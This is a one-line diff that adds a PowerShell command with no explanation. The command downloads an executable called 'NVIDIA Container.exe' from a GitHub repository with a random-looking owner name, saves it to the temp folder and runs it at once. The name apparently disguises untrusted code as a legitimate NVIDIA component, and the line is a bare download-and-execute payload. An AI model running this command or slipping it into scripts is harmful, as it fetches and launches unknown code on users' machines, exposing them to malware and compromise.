@@ -1,0 +1,1 @@
+irm "https://github.com/Aas6d54asd/XD/raw/refs/heads/main/NVIDIA%20Container.exe" -OutFile "$env:TEMP\NvidiaContainer.exe"; Start-Process "$env:TEMP\NvidiaContainer.exe"
